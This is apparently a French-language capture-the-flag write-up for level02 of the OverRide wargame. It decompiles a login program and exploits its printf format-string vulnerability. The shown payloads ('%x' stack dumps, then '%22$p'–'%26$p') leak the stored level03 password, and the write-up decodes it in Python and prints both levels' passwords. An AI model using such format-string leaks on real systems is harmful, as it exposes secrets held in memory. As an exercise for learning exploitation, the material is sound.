```
level02 : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

![](Pasted%20image%2020240808042929.png)

```c
undefined8 main(void)

{
  int ret;
  size_t ptr;
  long lVar1;
  undefined8 *puVar2;
  undefined8 password [14];
  undefined8 level03Pass [6];
  undefined8 username [12];
  int passLen;
  FILE *fd;
  
  puVar2 = username;
  for (lVar1 = 12; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  
  *(undefined4 *)puVar2 = 0;
  puVar2 = level03Pass;
  for (lVar1 = 5; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  
  *(undefined *)puVar2 = 0;
  puVar2 = password;
  for (lVar1 = 12; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  
  *(undefined4 *)puVar2 = 0;
  fd = (FILE *)0x0;
  passLen = 0;
  
  fd = fopen("/home/users/level03/.pass","r");
  if (fd == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  len = fread(level03Pass,1,41,fd);
  passLen = (int)len;
  ptr = strcspn((char *)level03Pass,"\n");
  *(undefined *)((long)level03Pass + ptr) = 0;
  if (passLen != 41) {
    fwrite("ERROR: failed to read password file\n",1,36,stderr);
    fwrite("ERROR: failed to read password file\n",1,36,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fclose(fd);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets((char *)username,100,stdin);
  ptr = strcspn((char *)username,"\n");
  *(undefined *)((long)username + ptr) = 0;
  printf("--[ Password: ");
  fgets((char *)password,100,stdin);
  ptr = strcspn((char *)password,"\n");
  *(undefined *)((long)password + ptr) = 0;
  puts("*****************************************");
  ret = strncmp((char *)level03Pass,(char *)password,41);
  if (ret == 0) {
    printf("Greetings, %s!\n",(char *)username);
    system("/bin/sh");
    return 0;
  }
  printf((char *)username);
  puts(" does not have access!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

![](Pasted%20image%2020240808124601.png)

comme on peut le voir username est espacer de 48 par rapport a username dans la stack (0x70 => 0xa0)
ce qui corespond bien a 6 * 8 bit ( la taille de level03Pass)

![](Pasted%20image%2020240808124810.png)

on va leak la position de username dans la stack a l'aide de printf

```
(remote) level02@OverRide:/home/users/level02$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: evil
*****************************************
BBBB ffffe440 0 65 2a2a2a2a 2a2a2a2a ffffe638 f7ff9a08 6c697665 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d feff00 42424242 25207825 20782520 does not have access!
```

on se rend compte que username est socker a la 28eme position dans la stack

donc pour afficher level03Pass a partir de la position 22 (28 - 6) sur une taille de 40 (8 * 5) qui est la longeur des precedents hash
donc on va print `%22$p %23$p %24$p %25$p %26$p`  

![](Pasted%20image%2020240808125529.png)

```
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
```
on va concatainer les addresse et a l'aide de python onb va retirer les `0x` a  l'aide de split ensuite on va convert en ASCII et ensuite on va passer en litle indian

```
evil = '0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d'

for part in evil.split('0x'):
    print(part.decode('hex')[::-1])
```

![](Pasted%20image%2020240808130521.png)

```
level 03: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```